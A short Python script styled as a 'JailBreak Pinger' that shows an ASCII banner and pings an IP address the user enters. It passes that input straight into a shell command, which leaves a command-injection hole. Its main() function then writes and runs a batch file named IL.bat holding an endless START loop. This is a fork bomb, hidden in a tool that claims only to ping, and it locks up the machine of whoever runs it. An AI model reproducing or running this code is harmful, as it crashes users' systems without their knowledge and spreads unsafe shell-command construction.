import os 
import pyfiglet
import time
from colorama import Fore

print(f'{Fore.BLUE}Welcome to JailBreak Pinger{Fore.WHITE}')
time.sleep(2)

if os.name == 'posix':
	os.system('clear')
elif os.name == 'nt':
	os.system('cls')

print(f"{Fore.RED} ▄▄▄██▀▀▀▄▄▄       ██▓ ██▓     ▄▄▄▄    ██▀███  ▓█████ ▄▄▄       ██ ▄█▀")
time.sleep(0.2)
print(f"{Fore.RED}   ▒██  ▒████▄    ▓██▒▓██▒    ▓█████▄ ▓██ ▒ ██▒▓█   ▀▒████▄     ██▄█▒") 
time.sleep(0.2)
print(f"{Fore.RED}   ░██  ▒██  ▀█▄  ▒██▒▒██░    ▒██▒ ▄██▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▓███▄░")
time.sleep(0.2) 
print(f"{Fore.RED}▓██▄██▓ ░██▄▄▄▄██ ░██░▒██░    ▒██░█▀  ▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▓██ █▄")
time.sleep(0.2) 
print(f"{Fore.RED} ▓███▒   ▓█   ▓██▒░██░░██████▒░▓█  ▀█▓░██▓ ▒██▒░▒████▒▓█   ▓██▒▒██▒ █▄")
time.sleep(0.2)
print(f"{Fore.RED} ▒▓▒▒░   ▒▒   ▓▒█░░▓  ░ ▒░▓  ░░▒▓███▀▒░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░▒ ▒▒ ▓▒")
time.sleep(0.2)
print(f"{Fore.RED} ▒ ░▒░    ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░▒░▒   ░   ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░ ░▒ ▒░")
time.sleep(0.2)
print(f"{Fore.RED} ░ ░ ░    ░   ▒    ▒ ░  ░ ░    ░    ░   ░░   ░    ░    ░   ▒   ░ ░░ ░")
time.sleep(0.2)
print(f"{Fore.RED} ░   ░        ░  ░ ░      ░  ░ ░         ░        ░  ░     ░  ░░  ░")
time.sleep(0.2)   
print(f"{Fore.RED}                                    ░{Fore.WHITE}")

ip = input("Enter IP -----> ")

os.system('ping ' + ip)

def main():
	h = open("IL.bat", "a")
	h.write('''
	@echo off 

	echo Welp shit
	:Up
	START
	goto Up''')
	h.close()
	time.sleep(2)
	os.system("IL.bat")
main()
